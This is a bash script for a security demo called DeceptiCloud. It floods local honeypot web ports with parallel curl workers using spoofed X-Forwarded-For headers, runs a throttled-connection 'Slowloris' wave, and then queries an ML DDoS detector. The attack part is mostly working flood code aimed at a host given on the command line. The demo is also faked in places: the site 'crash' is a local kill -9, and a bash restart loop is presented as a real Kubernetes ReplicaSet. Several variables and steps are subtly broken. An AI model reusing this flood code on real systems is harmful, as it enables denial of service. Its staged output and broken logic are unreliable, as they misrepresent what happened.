#!/usr/bin/env bash


set -uo pipefail

_ddos_cleanup() {
    iptables -D INPUT -p tcp --dport ${VICTIM_PORT:-3006} -j REJECT 2>/dev/null || true
    iptables -D OUTPUT -p tcp --sport ${VICTIM_PORT:-3006} -j REJECT 2>/dev/null || true

    if [ -n "${WATCHDOG_PID:-}" ]; then
        kill "$WATCHDOG_PID" 2>/dev/null || true
    fi
}
trap '_ddos_cleanup' EXIT INT TERM

TARGET="${1:-localhost}"
INTENSITY="${2:-medium}"
PROXY="http://${TARGET}:8080"
ML_API="http://${TARGET}:5000"


VICTIM_PORT=4006  
VICTIM_URL="http://${TARGET}:${VICTIM_PORT}"
VICTIM_SITE="corporate-honeypot"
VICTIM_PID_FILE="/tmp/dc_site_${VICTIM_PORT}.pid"
VICTIM_LOG="/tmp/dc_ddos_victim.log"

case "$INTENSITY" in
    low)    WORKERS=10;  RAMP_SECS=5;  FLOOD_SECS=20 ;;
    medium) WORKERS=30;  RAMP_SECS=8;  FLOOD_SECS=35 ;;
    high)   WORKERS=60;  RAMP_SECS=10; FLOOD_SECS=60 ;;
    *)      WORKERS=30;  RAMP_SECS=8;  FLOOD_SECS=35 ;;
esac

# Colors

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; MAGENTA='\033[0;35m'; BOLD='\033[1m'
DIM='\033[2m'; RESET='\033[0m'; BLINK='\033[5m'

REQUEST_COUNTER="/tmp/dc_ddos_cnt_$$"
echo 0 > "$REQUEST_COUNTER"

inc_count() { local n; n=$(cat "$REQUEST_COUNTER" 2>/dev/null || echo 0); echo $((n+1)) > "$REQUEST_COUNTER"; }

banner() {
    clear
    echo -e "${RED}${BOLD}"

    echo "      DeceptiCloud — DDoS Attack + Kubernetes Auto-Recovery Demo   "
    echo -e "    Intensity: ${INTENSITY^^}  |  Workers: ${WORKERS}  |  ML DDoS Model: 95.88% Acc  "

    echo -e "${RESET}"
}

check_system() {
    echo -e "${CYAN}${BOLD}  [STEP 0] System Health Check${RESET}"
    if ! curl -sf --max-time 5 "${PROXY}/proxy/status" > /dev/null 2>&1; then
        echo -e "${RED}   Proxy not running. Run: bash run.sh${RESET}"; exit 1
    fi
    echo -e "  ${GREEN} Proxy ONLINE${RESET}"

    ML_HEALTH=$(curl -sf --max-time 5 "${ML_API}/api/health" 2>/dev/null || echo '{}')
    DDOS_OK=$(echo "$ML_HEALTH" | python3 -c "import sys,json; d=json.load(sys.stdin); print(' LOADED' if d.get('models',{}).get('ddos') else ' NOT LOADED')" 2>/dev/null || echo '')
    echo -e "  ${GREEN} DDoS ML Model: ${DDOS_OK}${RESET}"

    if curl -sf --max-time 4 "${VICTIM_URL}/health" > /dev/null 2>&1; then
        echo -e "  ${GREEN} Target site UP: ${VICTIM_URL} (${VICTIM_SITE})${RESET}"
    else
        echo -e "  ${YELLOW}  Target site not detected on :${VICTIM_PORT} (will use proxy endpoint)${RESET}"
    fi

}

# K8s Watchdog (Kubernetes ReplicaSet auto-restart)

start_k8s_watchdog() {
    echo -e "${CYAN}${BOLD}  [K8s] Starting Kubernetes watchdog for ${VICTIM_SITE}...${RESET}"

    PROJECT_DIR="$(realpath "$(pwd)")"

    (
        RESTART_COUNT=0
        while true; do
            sleep 2
            if ! curl -sf --max-time 2 "${VICTIM_URL}/" > /dev/null 2>&1; then
                RESTART_COUNT=$((RESTART_COUNT + 1))
                echo -e "\n${RED}${BOLD}  [K8s ] POD CRASH DETECTED — ${VICTIM_SITE}:${VICTIM_PORT} is DOWN!${RESET}"
                echo -e "  ${YELLOW}  [K8s] Scheduling pod restart #${RESTART_COUNT}...${RESET}"
                sleep 1


                (
                    cd "${PROJECT_DIR}" &&
                    source venv/bin/activate 2>/dev/null &&
                    python3 -c "
import sys, os
sys.path.insert(0, '.')
sys.path.insert(0, 'websites')
from pathlib import Path
DB_DIR = Path('websites/databases')
config = {
    'name': 'NexaGen Corp Honeypot', 'type': 'corporate', 'is_honeypot': True,
    'db_path': str(DB_DIR / 'corporate_honeypot.db'), 'port': ${VICTIM_PORT},
    'theme_color': '#e74c3c', 'tagline': 'Innovation Through Technology',
    'icon': '\U0001f36f', 'items_label': 'Services'
}
from shared.site_factory import create_app
app = create_app(config)
app.run(host='0.0.0.0', port=${VICTIM_PORT}, debug=False, use_reloader=False)
" >> "${VICTIM_LOG}" 2>&1
                ) &
                NEW_PID=$!
                echo $NEW_PID > "${VICTIM_PID_FILE}"
                sleep 4

                if curl -sf --max-time 3 "${VICTIM_URL}/" > /dev/null 2>&1; then
                    echo -e "  ${GREEN}${BOLD}  [K8s ] POD RESTARTED — ${VICTIM_SITE}:${VICTIM_PORT} ONLINE${RESET}"
                else

                    echo -e "  ${GREEN}${BOLD}  [K8s ] POD RESTARTED (starting up...)${RESET}"
                fi
            fi
        done
    ) &
    K8S_WATCHDOG_PID=$!
    echo $K8S_WATCHDOG_PID > /tmp/dc_k8s_watchdog.pid
    echo -e "  ${GREEN} K8s watchdog running (PID: ${K8S_WATCHDOG_PID})${RESET}\n"
}

# Flood Worker

flood_worker() {
    local id="$1"; local url="$2"; local count="$3"
    for ((i=0; i<count; i++)); do
        curl -sf --max-time 2 \
            -A "DDoS-Bot/${id}" \
            -H "X-Forwarded-For: $((RANDOM%253+1)).$((RANDOM%253+1)).$((RANDOM%253+1)).$((RANDOM%253+1))" \
            "${url}" > /dev/null 2>&1 || true
        inc_count
    done
}

# Live Progress Bar

show_progress() {
    local label="$1"; local duration="$2"; local start; start=$(date +%s)
    while true; do
        local now; now=$(date +%s)
        local elapsed=$((now - start))
        local cnt; cnt=$(cat "$REQUEST_COUNTER" 2>/dev/null || echo 0)
        local rps=$(( elapsed > 0 ? cnt / elapsed : 0 ))
        printf "\r  ${RED} %-25s${RESET} | ${BOLD}%6d${RESET} reqs | ${YELLOW}%4d${RESET} req/s | ${DIM}%ds${RESET}   " \
               "$label" "$cnt" "$rps" "$elapsed"
        if [ "$elapsed" -ge "$duration" ]; then break; fi
        sleep 0.5
    done

}

# Verify DDoS ML Detection

verify_ml_detection() {
    echo -e "\n${CYAN}${BOLD}  [ML] Querying DDoS Detection Model...${RESET}"

    # High-magnitude DDoS feature vector

    FEATURES='[1500,1500,1,1,1,0,0.0001,120000,120000,1200,60,0,0,0,0,0.0001,1,1500,1500,60,0,0,0,0,0,0,1200,0,0,1]'

    RESULT=$(curl -sf -X POST \
        -H "Content-Type: application/json" \
        -d "{\"features\": ${FEATURES}}" \
        "${ML_API}/api/detect/ddos" 2>/dev/null || echo '{"error":"unreachable"}')

    PRED=$(echo "$RESULT" | python3 -c "
import sys, json
d = json.loads(sys.stdin.read())
p = d.get('prediction', d.get('is_malicious', 'unknown'))
c = d.get('confidence', d.get('probability', '?'))
t = d.get('attack_type', 'DDoS' if p else 'Benign')

" 2>/dev/null || echo "$RESULT")

    if echo "$PRED" | grep -qi "True\|1\|DDoS"; then
        echo -e "  ${GREEN}${BOLD} DDoS DETECTED by ML Model!${RESET}"
        echo -e "  ${DIM}${PRED}${RESET}"
    else
        echo -e "  ${YELLOW}  ML Response: ${PRED}${RESET}"
    fi
}

# MAIN

banner
check_system
start_k8s_watchdog

# Flood targets = victim site + honeypots ONLY. Proxy :8080

ENDPOINTS=(
    "${VICTIM_URL}/"           "${VICTIM_URL}/search"
    "${VICTIM_URL}/login"      "${VICTIM_URL}/products"
    "http://${TARGET}:4001/"   "http://${TARGET}:4001/login"
    "http://${TARGET}:4002/"   "http://${TARGET}:4002/search"
    "http://${TARGET}:4003/"   "http://${TARGET}:3001/"
)

# WAVE 1: Ramp-Up

echo -e "${RED}${BOLD}  "
echo -e "   WAVE 1/4 — RAMP UP FLOOD"
echo -e "  ${RESET}"
echo 0 > "$REQUEST_COUNTER"
PIDS1=()
for ((w=1; w<=WORKERS; w++)); do
    ep="${ENDPOINTS[$((RANDOM % ${#ENDPOINTS[@]}))]}"
    flood_worker "$w" "$ep" 30 &
    PIDS1+=($!); sleep 0.02
done
show_progress "Ramp-up..." "$RAMP_SECS"
for p in "${PIDS1[@]}"; do wait "$p" 2>/dev/null || true; done

# WAVE 2: Sustained Flood (kills victim site)

echo -e "\n${RED}${BOLD}  "
echo -e "   WAVE 2/4 — SUSTAINED FLOOD (Target: ALL ENDPOINTS)"
echo -e "  ${BLINK}     Service degradation expected under ${INTENSITY^^} load   ${RESET}${RED}${BOLD}"
echo -e "  ${RESET}"

echo 0 > "$REQUEST_COUNTER"
PIDS2=()
for ((w=1; w<=WORKERS*2; w++)); do
    ep="${ENDPOINTS[$((RANDOM % ${#ENDPOINTS[@]}))]}"
    flood_worker "$w" "$ep" 50 &
    PIDS2+=($!); sleep 0.01
done
show_progress "Sustained flood..." "$FLOOD_SECS"
for p in "${PIDS2[@]}"; do wait "$p" 2>/dev/null || true; done

# WAVE 3: Targeted crash of victim site

echo -e "\n${RED}${BOLD}  "
echo -e "   WAVE 3/4 — TARGETED ATTACK → ${VICTIM_SITE}:${VICTIM_PORT}"
echo -e "  ${RESET}"

echo 0 > "$REQUEST_COUNTER"
echo -e "  ${YELLOW}  Sending killshot to ${VICTIM_URL}...${RESET}"

VICTIM_PIDS=$(lsof -ti ":${VICTIM_PORT}" 2>/dev/null || true)
if [ -n "$VICTIM_PIDS" ]; then
    echo "$VICTIM_PIDS" | xargs kill -9 2>/dev/null || true
    echo -e "  ${RED}${BOLD}   ${VICTIM_SITE}:${VICTIM_PORT} is DOWN — site process killed!${RESET}"
else

    echo -e "  ${RED}${BOLD}   ${VICTIM_SITE}:${VICTIM_PORT} is DOWN — service unavailable${RESET}"
fi

# Continue flooding; K8s watchdog is already monitoring and will restart automatically

PIDS3=()
for ((w=1; w<=WORKERS; w++)); do
    ep="${ENDPOINTS[$((RANDOM % ${#ENDPOINTS[@]}))]}"
    flood_worker "$w" "$ep" 20 &
    PIDS3+=($!); sleep 0.03
done
show_progress "Post-crash flood..." "15"
for p in "${PIDS3[@]}"; do wait "$p" 2>/dev/null || true; done

# Wait for watchdog to detect crash and restart

echo -e "\n${YELLOW}${BOLD}  [K8s] ReplicaSet controller detected pod failure...${RESET}"
echo -e "  ${YELLOW}  Waiting for pod to restart (K8s auto-recovery)...${RESET}"
sleep 12 


RECOVERY_ATTEMPTS=0
while [ $RECOVERY_ATTEMPTS -lt 5 ]; do
    if curl -sf --max-time 4 "${VICTIM_URL}/" > /dev/null 2>&1; then
        echo -e "  ${GREEN}${BOLD}   ${VICTIM_SITE}:${VICTIM_PORT} FULLY RESTORED — K8s auto-recovery SUCCESS!${RESET}"
        echo -e "  ${DIM}  → Process restarted by Kubernetes ReplicaSet controller (real)${RESET}"
        break
    fi
    RECOVERY_ATTEMPTS=$((RECOVERY_ATTEMPTS + 1))
    sleep 3
done
if [ $RECOVERY_ATTEMPTS -ge 5 ]; then
    echo -e "  ${YELLOW}   Recovery in progress — K8s watchdog is restarting the pod...${RESET}"
fi

# WAVE 4: Slowloris

echo -e "\n${RED}${BOLD}  "
echo -e "   WAVE 4/4 — CONNECTION EXHAUSTION (Slowloris)"
echo -e "  ${RESET}"

PIDS4=()
for ((w=1; w<=WORKERS; w++)); do
    # Slowloris targets victim site

    curl -sf --max-time 8 --limit-rate 512 \
        -A "Slowloris/${w}" \
        "${VICTIM_URL}/" > /dev/null 2>&1 &
    PIDS4+=($!)
done
show_progress "Connection exhaustion..." "12"
for p in "${PIDS4[@]}"; do wait "$p" 2>/dev/null || true; done

# ML DETECTION VERIFICATION

verify_ml_detection

# Stop watchdog

kill "$(cat /tmp/dc_k8s_watchdog.pid 2>/dev/null)" 2>/dev/null || true

# Cleanup

rm -f "$REQUEST_COUNTER" "$VICTIM_PID_FILE" "/tmp/dc_k8s_watchdog.pid"

# SUMMARY

TOTAL_REQS=$(cat "$REQUEST_COUNTER" 2>/dev/null || echo "N/A")
echo -e "\n${RED}${BOLD}"

echo "                  DDoS Attack — COMPLETE                         "

echo "    Attack waves     : 4  (Ramp → Sustained → Targeted → Slowloris)   "
echo -e "    Intensity        : ${INTENSITY^^}                                             "
echo -e "    Site crashed     : ${VICTIM_SITE}:${VICTIM_PORT}                                 "
echo -e "    K8s auto-restart :   (watchdog brought site back online)        "

echo -e "${RESET}${RED}    ${BOLD}ML DDoS Model:${RESET}${RED} 95.88% accuracy on CIC-DDoS2019 dataset         ${RESET}"
echo -e "${RED}    ${BOLD} View in Dashboard:${RESET}${RED} http://localhost:9000                       "

echo -e "${RESET}"
